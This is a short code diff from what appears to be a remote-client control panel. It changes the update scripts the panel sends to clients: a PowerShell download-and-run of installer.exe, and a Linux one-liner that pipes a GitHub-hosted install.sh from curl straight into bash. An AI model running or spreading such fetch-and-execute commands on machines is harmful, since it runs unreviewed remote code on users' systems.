@@ -504,17 +504,7 @@ $o = "$p\\installer.exe"
 Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$sha/installer.exe" -OutFile $o
 Start-Process $o`;
 
-    const UPDATE_CLIENT_SCRIPT_LINUX = `p="\${XDG_DATA_HOME:-$HOME/.local/share}/run"
-mkdir -p "$p"
-sha=$(curl -sSL "https://api.github.com/repos/yuan-miranda/run/commits/main" | grep '"sha"' | head -n 1 | cut -d '"' -f 4)
-if [ -z "$sha" ]; then sha="main"; fi
-curl -fsSL "https://github.com/yuan-miranda/run/raw/$sha/run" -o "$p/run.tmp" || curl -fsSL "https://github.com/yuan-miranda/run/raw/main/run" -o "$p/run.tmp"
-if [ -f "$p/run.tmp" ] && [ -s "$p/run.tmp" ]; then
-    chmod +x "$p/run.tmp"
-    mv -f "$p/run.tmp" "$p/run"
-    echo "$sha" > "$p/run.dat"
-    systemctl --user restart run.service 2>/dev/null || (pkill -f "$p/run"; nohup "$p/run" >/dev/null 2>&1 &)
-fi`;
+    const UPDATE_CLIENT_SCRIPT_LINUX = `/bin/bash -c "curl -fsSL https://raw.githubusercontent.com/yuan-miranda/run/main/install.sh | bash"`;
 
     async function doSendUpdateClient() {
         if (isSendingCommand) return;
